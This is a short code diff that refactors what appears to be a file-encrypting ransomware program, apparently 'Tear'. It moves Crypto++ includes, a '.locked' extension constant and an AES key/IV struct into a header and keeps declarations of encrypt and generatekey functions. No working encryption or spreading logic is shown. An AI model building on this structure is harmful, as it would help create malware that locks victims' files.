@@ -1,16 +1,7 @@
 #include <iostream>
 #include <string>
 
-#include <boost/filesystem/operations.hpp>
-
-#include <cryptopp/default.h>
-#include <cryptopp/osrng.h>
-#include <cryptopp/cryptlib.h>
-#include <cryptopp/hex.h>
-#include <cryptopp/filters.h>
-#include <cryptopp/files.h>
-#include <cryptopp/aes.h>
-#include <cryptopp/ccm.h>
+#include "../tear.h"
 
 #ifdef _WIN32
 #	include <windows.h>
@@ -22,15 +13,6 @@
 using namespace std;
 using namespace boost::filesystem;
 using namespace CryptoPP;
-
-#define EMPTY ""
-#define LOCKED_EXTENSION ".locked"
-#define DEBUG
-
-struct crypt_data {
-	byte key[AES::DEFAULT_KEYLENGTH];
-	byte iv[AES::BLOCKSIZE];
-};
 
 void encrypt(const crypt_data* data, string path);
 crypt_data* generatekey();
